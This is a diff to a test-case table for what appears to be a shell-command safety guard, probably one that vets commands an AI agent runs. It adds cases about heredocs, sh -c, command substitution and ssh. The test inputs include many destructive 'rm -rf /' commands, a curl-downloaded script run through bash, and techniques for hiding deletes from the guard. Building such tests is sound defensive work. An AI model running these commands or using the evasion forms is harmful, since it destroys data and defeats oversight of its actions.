@@ -771,8 +771,10 @@ CASES = [
     # read it as a script, the allow is withdrawn -- silence, never a prompt.
     ("heredoc: a destructive body fed to ssh withdraws the allow",
      "ssh h <<'EOF' && rm -rf ./build\nrm -rf /\nEOF", "pass"),
-    ("heredoc: ...and fed to docker exec",
-     "docker exec -i c sh <<'EOF' && rm -rf ./build\nrm -rf /\nEOF", "pass"),
+    # A shell behind docker exec now reads that body, as the ssh far end
+    # would, so the root delete in it denies rather than withdrawing.
+    ("heredoc: a body fed to a shell behind docker exec is read",
+     "docker exec -i c sh <<'EOF' && rm -rf ./build\nrm -rf /\nEOF", "deny"),
     ("heredoc: the withdrawal never touches an ask",
      "ssh h <<'EOF' && rm -rf \"$OUT\"/*\nrm -rf /\nEOF", "ask"),
     # A heredoc inside an ssh remote string is only masked one level down --
@@ -785,20 +787,23 @@ CASES = [
     # Inside a remote string the heredoc body may be the only place the rm
     # appears, so strip_data's mask leaves nothing guarded and the analysis
     # returns early -- the withdrawal must be recorded there too.
+    # Task 4 now reads that body: an inner `bash <<'EOF'` runs it, so it is judged.
     ("heredoc: bash reading a destructive body inside a remote string",
-     "rm -rf ./dist && ssh host \"bash <<'EOF'\nrm -rf /\nEOF\"", "pass"),
-    ("heredoc: ...and sh", "rm -rf ./dist && ssh host \"sh <<'EOF'\nrm -rf /\nEOF\"", "pass"),
+     "rm -rf ./dist && ssh host \"bash <<'EOF'\nrm -rf /\nEOF\"", "deny"),
+    ("heredoc: ...and sh", "rm -rf ./dist && ssh host \"sh <<'EOF'\nrm -rf /\nEOF\"", "deny"),
+    # ...and a shell behind docker exec there, read as a far end (was pass).
     ("heredoc: ...and docker exec",
-     "rm -rf ./dist && ssh host \"docker exec -i c sh <<'EOF'\nrm -rf /\nEOF\"", "pass"),
+     "rm -rf ./dist && ssh host \"docker exec -i c sh <<'EOF'\nrm -rf /\nEOF\"", "deny"),
     # Left unmasked, a heredoc's body can pair a quote with one later on the
     # line and hide code from the tokenizer, so a heredoc the guard cannot
     # place asks instead.
     ("heredoc: an unplaceable heredoc asks, whatever its body holds",
      "rm -rf ./build; cat \"a #x\" <<'EOF'\nit's\nEOF\nrm -rf / # it's", "ask"),
-    # The parse-failure return must record the withdrawal too: shlex rejects
-    # $'...', so this inner string never tokenizes.
-    ("heredoc: a remote string that fails to parse still withdraws",
-     "rm -rf ./dist && ssh host \"rm x; echo \\$'a\\\\'b'; bash <<'EOF'\nrm -rf /\nEOF\"", "pass"),
+    # shlex rejects $'...', so this inner string never tokenizes. The remote
+    # string is read with the line's danger, so the parse failure asks; it
+    # was a withdrawal while ssh read it without that danger.
+    ("heredoc: a remote string that fails to parse asks",
+     "rm -rf ./dist && ssh host \"rm x; echo \\$'a\\\\'b'; bash <<'EOF'\nrm -rf /\nEOF\"", "ask"),
     ("heredoc: a # straight after the delimiter is not a comment",
      "cat <<'EOF'# it's\n'; rm -rf /\nEOF\n' && rm -rf ./build", "ask"),
     # --- comment boundaries ---------------------------------------------------
@@ -822,8 +827,8 @@ CASES = [
     ("mention: written to a file", "grep 'rm -rf' f > run.sh", "ask"),
     ("mention: through tee", "grep 'rm -rf' f | tee run.sh", "ask"),
     ("mention: |& into a shell", "grep 'rm -rf' f |& sh", "ask"),
-    ("mention: a real rm in a substitution", 'grep x "$(rm -rf /)"', "ask"),
-    ("mention: a real rm in backticks", "echo `rm -rf /`", "ask"),
+    ("mention: a real rm in a substitution", 'grep x "$(rm -rf /)"', "deny"),
+    ("mention: a real rm in backticks", "echo `rm -rf /`", "deny"),
     ("mention: sed can execute", "sed -n '/rm -rf/p' f", "ask"),
     ("mention: awk can execute", "awk '/rm -rf/' f", "ask"),
     # The silence is for a whole line of plain readers -- a pipe or redirect on
@@ -846,6 +851,178 @@ CASES = [
     ("mention: a plan check with assignments around it",
      "P=docs/plan.md; grep -n 'rm -rf' \"$P\" | head; wc -l \"$P\"", "pass"),
     ("mention: after a cd", "cd /home/u/project && grep -rn 'rm -r' src | head -40", "pass"),
+    # --- a script handed to a shell is read, not refused ---------------------
+    ("sh -c: no delete in the script", "find . -name x -exec sh -c 'echo \"$1\"' _ {} \\;", "pass"),
+    ("sh -c: a safe delete beside it",
+     "docker exec c sh -c 'cat /etc/os-release'; rm -rf ./build", "allow"),
+    ("bash -c: a literal delete is judged", "bash -c 'rm -rf /tmp/build'", "allow"),
+    ("bash -c: a root delete denies", 'bash -c "rm -rf /"', "deny"),
+    ("bash -lc: a bundled -c", "bash -lc 'rm -rf /'", "deny"),
+    ("bash -c: the outer shell may expand $X first",
+     'bash -c "X=/tmp/a; rm -rf $X/*"', "ask"),
+    ("sh -c: positional parameters never clear",
+     "sh -c 'rm -rf \"${1:?}\"/*' _ /etc", "ask"),
+    ("sh -c: inside another command, no local cwd applies",
+     "docker exec c sh -c 'rm -rf ./build'", "ask"),
+    ("bash -c: unreadable options still ask", "bash --rcfile x -c 'rm -rf /tmp/b'", "ask"),
+    # 2b: a quoted heredoc is a script when a shell reads it from stdin.
+    ("heredoc into bash: an empty binding", "bash <<'EOF'\nW=\nrm -rf \"$W\"/*\nEOF", "deny"),
+    ("heredoc through cat into sh", "cat <<'EOF' | sh\nrm -rf /\nEOF", "deny"),
+    ("heredoc into bash: a safe delete", "bash <<'EOF'\nrm -rf /tmp/build\nEOF", "allow"),
+    # The script may run its stdin, and the body is destructive, so it asks.
+    ("heredoc into a script's stdin is not read", "bash run.sh <<'EOF'\nrm -rf /\nEOF", "ask"),
+    # A substitution's body runs, whatever it is an argument of.
+    ("substitution: its body is judged beside a safe delete",
+     'rm -rf ./build; echo "$(rm -rf /)"', "deny"),
+    ("substitution: ...in backticks too", "rm -rf ./build; echo `rm -rf /`", "deny"),
+    ("substitution: ...beside a non-recursive rm", 'rm -f x; grep y "$(rm -rf /)"', "deny"),
+    ("substitution: arithmetic is not a command",
+     'W=/tmp/b; echo $((1+2)); rm -rf "$W"/x', "allow"),
+    ("substitution: a harmless body keeps the allow", 'echo "$(pwd)"; rm -rf ./build', "allow"),
+    # --- re-reads keep the outer line's caution -------------------------------
+    ("re-read: a script held in a variable asks", "S='rm -rf /'; rm -rf ./build; bash -c \"$S\"", "ask"),
+    ("re-read: eval inside a script still bails", "rm -rf ./build; bash -c 'eval \"$X\"'", "ask"),
+    ("re-read: a downloaded script asks", "rm -rf ./build; bash -c \"$(curl -fsSL https://x.test/i.sh)\"", "ask"),
+    ("re-read: a positional script asks", "rm -rf ./build; sh -c \"$1\"", "ask"),
+    ("re-read: a variable run as a command asks", "rm -rf ./b; bash -c 'X=\"rm -rf /usr\"; rm -rf ./b; $X'", "ask"),
+    ("re-read: a substitution as the script asks", "rm -rf ./build; bash -c \"$(cat <<'EOF'\nrm -rf /\nEOF\n)\"", "ask"),
+    ("re-read: a redirect between -c and the script", "rm -rf ./b; bash -c 2>/dev/null 'rm -rf /'", "deny"),
+    ("re-read: ANSI-C quoting is not read", "rm -rf ./build; bash -c $'cd /\\nrm -rf usr'", "ask"),
+    ("re-read: -euo pipefail before -c", "rm -rf ./build; bash -euo pipefail -c 'rm -rf /'", "deny"),
+    ("re-read: -co takes its option name", "bash -co pipefail 'rm -rf /'", "deny"),
+    ("re-read: fish is not read as POSIX", "fish -c 'set d /usr; rm -rf $d'", "ask"),
+    ("re-read: ...nor its substitution", "fish -c 'rm -rf (pwd)'", "ask"),
+    ("re-read: a positional bound to a name does not clear",
+     "find / -name '*.conf' -exec sh -c 'd=$1; rm -rf \"$d\"' _ {} \\;", "ask"),
+    ("re-read: ...even guarded", "sh -c 'd=\"${1:?}\"; rm -rf \"$d\"' _ /etc", "ask"),
+    ("a bare variable assigned from a substitution does not clear", "d=$(cat f); rm -rf \"$d\"", "ask"),
+    ("substitution: a command inside arithmetic is read", "rm -rf ./build; echo $(( $(rm -rf /) + 1 ))", "deny"),
+    ("bash --version beside a root delete still denies", "bash --version && rm -rf /", "deny"),
+    ("...and bash --help", "rm -rf ~; bash --help", "deny"),
+    ("an unknown long option before -c is unreadable", "rm -rf ./b; bash --rcfile x -c 'rm -rf /'", "ask"),
+    ("bash --version beside a safe delete clears", "bash --version | head -1; rm -rf ./build", "allow"),
+    ("heredoc: a shell's heredoc inside a substitution is read",
+     "rm -rf ./build; x=$(bash <<'EOF'\nrm -rf /\nEOF\n)", "deny"),
+    ("substitution: a commit message is data",
+     "git commit -m \"$(cat <<EOF\nfix: stop rm -rf / from clearing\nEOF\n)\"", "pass"),
+    ("heredoc: bash -s with arguments reads stdin", "bash -s x <<'EOF'\nrm -rf /\nEOF", "deny"),
+    ("heredoc: bash - reads stdin", "bash - <<'EOF'\nrm -rf /\nEOF", "deny"),
+    ("substitution: escaped backticks nest",
+     "rm -rf ./build; echo `cd /tmp; rm -rf ./x; echo \\`rm -rf /\\``", "deny"),
+    ("deep harmless nesting stays silent", "git log $(echo $(echo $(echo $(git rev-parse HEAD))))", "pass"),
+    # ...and what those rules settle around their edges.
+    ("$X run as a command beside a root delete still denies", "$X; rm -rf /", "deny"),
+    ("re-read: a -c past a word the scan stops at", "rm -rf ./b; bash $OPTS -c 'rm -rf /'", "ask"),
+    ("re-read: fish --command is fish -c", "fish --command 'rm -rf /tmp/x'; rm -rf ./b", "ask"),
+    ("a literal assigned after the leading run is judged", "set -e; W=/; rm -rf \"$W\"", "deny"),
+    ("...and a safe one keeps the bare-variable allow", "set -e; W=/tmp/x; rm -rf \"$W\"", "allow"),
+    ("substitution: arithmetic's own expansions are not commands",
+     "rm -rf ./build; n=$(( $n + 1 ))", "allow"),
+    ("substitution: a $(( that closes early is a subshell",
+     "rm -rf ./build; x=$((cd /; rm -rf usr); (true))", "deny"),
+    ("heredoc: bash - with a script file does not read stdin as its script",
+     "bash - x <<'EOF'\nrm -rf /\nEOF", "ask"),
+    ("heredoc: -euo pipefail before a stdin script", "bash -euo pipefail <<'EOF'\nrm -rf /\nEOF", "deny"),
+    # --- re-read text: a variable may take its value from outside it ----------
+    # The outer shell expands a double-quoted script first, and a substitution
+    # or a heredoc-fed shell sees the line's variables and exports. Neither
+    # free pass -- "empty only errors", "${D:?} is not empty" -- holds there.
+    ("re-read: an outer binding reaches a -c script", 'D=/; bash -c "rm -rf $D"', "ask"),
+    ("re-read: ...guarded or not", 'D=/; sh -c "rm -rf ${D:?}"', "ask"),
+    ("re-read: ...a substitution's body", "D=/; echo $(rm -rf $D)", "ask"),
+    ("re-read: ...quoted inside one", 'D=/; x=$(rm -rf "$D")', "ask"),
+    ("re-read: ...in backticks", "D=/; echo `rm -rf $D`", "ask"),
+    ("re-read: a loop variable reaches a substitution",
+     "for d in / /usr; do echo $(rm -rf $d); done", "ask"),
+    ("re-read: ...a while-read one", 'while read d; do echo $(rm -rf "$d"); done < list', "ask"),
+    ("re-read: an unreadable value reaches a substitution",
+     'd=$(cat f); echo $(rm -rf "$d")', "ask"),
+    ("re-read: a positional reaches a -c script", 'd=$1; bash -c "rm -rf $d"', "ask"),
+    ("re-read: a mktemp result reaches a -c script", 'T=$(mktemp -d); bash -c "rm -rf $T"', "ask"),
+    ("re-read: ...through find -exec sh -c",
+     'W=/; find /tmp -name x -exec sh -c "rm -rf $W" \\;', "ask"),
+    ("re-read: an export reaches a heredoc-fed shell",
+     "export W=/; bash <<'EOF'\nrm -rf $W\nEOF", "ask"),
+    ("re-read: an outer binding reaches ssh", 'D=/; ssh h "rm -rf $D"', "ask"),
+    # --- ssh reads its remote string with the line's caution ----------------
+    ("ssh: a remote command held in a variable", "S='rm -rf /'; rm -rf ./b; ssh h \"$S\"", "ask"),
+    ("ssh: ...that only starts with one", "rm -rf ./b; ssh h \"${S}x\"", "ask"),
+    ("ssh: eval on the far end", "rm -rf ./b; ssh h 'eval \"$X\"'", "ask"),
+    ("ssh: a variable run as a command on the far end", "rm -rf ./b; ssh h \"x; $S\"", "ask"),
+    # --- a message-flag substitution still runs -------------------------------
+    # Its value is data to the raw-text rules, but the substitution executes,
+    # so a destructive one withdraws the allow rather than vanishing.
+    ("message: a substitution in a commit message withdraws",
+     "rm -rf ./b; git commit -m \"$(rm -rf /)\"", "pass"),
+    ("message: ...in a PR body", "rm -rf ./b; gh pr create --body \"$(rm -rf /)\"", "pass"),
+    ("message: ...behind a cd", "rm -rf ./b; git commit -m \"$(cd /; rm -rf usr)\"", "pass"),
+    ("message: ...a shell reading a heredoc in one",
+     "rm -rf ./b; git commit -m \"$(bash <<'EOF'\nrm -rf /\nEOF\n)\"", "pass"),
+    ("message: a heredoc the message cats is prose",
+     "git commit -m \"$(cat <<'EOF'\nrm -rf cleanup\nEOF\n)\" && rm -rf ./b", "allow"),
+    # --- a message-flag substitution is read as code, past its heredocs -------
+    # Only the heredoc bodies in it are prose. What is left runs, nested
+    # message flags included, so anything there that could hide a delete
+    # withdraws: an expansion run as a command, a nested substitution, eval,
+    # source, `.`, xargs or a shell.
+    ("message: an expansion run with -rf",
+     "rm -rf ./b; git commit -m \"$(${X:-rm} -rf /)\"", "pass"),
+    ("message: ...spelled $X", "rm -rf ./b; git commit -m \"$($X -rf /)\"", "pass"),
+    ("message: a substitution in a nested message flag",
+     "rm -rf ./b; git commit -m \"$(git commit -m \"$(rm -rf /)\")\"", "pass"),
+    ("message: ...behind echo -m", "rm -rf ./b; git commit -m \"$(echo -m \"$(rm -rf /)\")\"",
+     "pass"),
+    ("message: a variable run as the whole body", "rm -rf ./b; git commit -m \"$($X)\"", "pass"),
+    ("message: eval", "rm -rf ./b; git commit -m \"$(eval \\\"$X\\\")\"", "pass"),
+    ("message: bash -c", "rm -rf ./b; git commit -m \"$(bash -c \\\"$X\\\")\"", "pass"),
+    ("message: a sourced file", "rm -rf ./b; git commit -m \"$(. ./x)\"", "pass"),
+    # The round-2 rule stays: a heredoc read by anything but a plain cat.
+    ("message: ssh reading a heredoc in one",
+     "rm -rf ./b; git commit -m \"$(ssh h <<'EOF'\nrm -rf /\nEOF\n)\"", "pass"),
+    ("message: a plain cat of a file keeps the allow",
+     "git commit -m \"$(cat msg.txt)\" && rm -rf ./b", "allow"),
+    # --- a bail-out no longer hides a deny beside it ----------------------------
+    ("bail: eval in a script beside a root delete", "rm -rf ./b; bash -c 'rm $(x) /; eval y'", "deny"),
+    ("bail: eval in a subshell", "rm -rf ./b; ( eval \"$X\" )", "ask"),
+    ("bail: eval in a group", "rm -rf ./b; { eval \"$X\"; }", "ask"),
+    ("bail: a command name built from an expansion", "rm -rf ./b; ${X}rm -rf /*", "ask"),
+    # --- a shell fed a heredoc the guard does not read ------------------------
+    ("heredoc: fish reading a destructive body", "fish <<'EOF'\nrm -rf /\nEOF", "ask"),
+    ("heredoc: ...piped from cat", "cat <<'EOF' | fish\nrm -rf /\nEOF", "ask"),
+    ("heredoc: ...with the redirection first", "<<'EOF' bash\nrm -rf /\nEOF", "ask"),
+    # --- a line's literal values reach a suffixed expansion -------------------
+    ("an empty literal after the leading run denies", "set -e; W=; rm -rf \"$W\"/*", "deny"),
+    # --- an expansion run with a recursive flag ---------------------------------
+    ("an expansion as the command, with -rf, is danger", "${X:-rm} -rf /", "ask"),
+    # --- ...and reaches text another reader runs -----------------------------
+    # No guarded name anywhere, so the raw-text early exits returned before
+    # the script, the heredoc or the substitution was read.
+    ("expansion -rf: in a -c script", "bash -c '${X:-rm} -rf /'", "ask"),
+    ("expansion -rf: in a heredoc fed to bash", "bash <<'EOF'\n${X:-rm} -rf /\nEOF", "ask"),
+    ("expansion -rf: in a substitution", "echo $(${X:-rm} -rf /)", "ask"),
+    ("expansion -rf: a bare $X in a heredoc piped to bash",
+     "cat <<'EOF' | bash\n$X -rf /\nEOF", "ask"),
+    # A substitution in command position is the same hole.
+    ("expansion -rf: a substitution as the command", "$(printf r; printf m) -rf /", "ask"),
+    # --- a heredoc piped into a shell behind another command -------------------
+    # The shell is not the segment's command word, so the body is read as the
+    # ssh far end reads its string: no local cwd, nothing bound in it clears.
+    ("heredoc: into bash over ssh", "cat <<'EOF' | ssh h bash\nrm -rf /\nEOF", "deny"),
+    ("heredoc: ...behind sudo -E", "cat <<'EOF' | sudo -E bash\nrm -rf /\nEOF", "deny"),
+    ("heredoc: ...behind sudo -u root", "cat <<'EOF' | sudo -u root bash\nrm -rf /\nEOF", "deny"),
+    ("heredoc: ...behind env -i", "cat <<'EOF' | env -i bash\nrm -rf /\nEOF", "deny"),
+    ("heredoc: ...behind nice -n 5", "cat <<'EOF' | nice -n 5 bash\nrm -rf /\nEOF", "deny"),
+    ("heredoc: ...into docker exec", "cat <<'EOF' | docker exec -i c bash\nrm -rf /\nEOF",
+     "deny"),
+    ("heredoc: ...redirected into ssh's own segment", "ssh h bash <<'EOF'\nrm -rf /\nEOF",
+     "deny"),
+    ("heredoc: ...no local cwd applies", "cat <<'EOF' | docker exec -i c bash\nrm -rf ./build\nEOF",
+     "ask"),
+    ("heredoc: ...and a binding in the body does not clear",
+     "cat <<'EOF' | ssh h bash\nW=/tmp/x\nrm -rf \"$W\"/*\nEOF", "ask"),
+    ("heredoc: ...fish there still asks", "cat <<'EOF' | ssh h fish\nrm -rf /\nEOF", "ask"),
+    ("heredoc: ...and so does a script operand",
+     "cat <<'EOF' | ssh h bash run.sh\nrm -rf /\nEOF", "ask"),
 ]
 
 
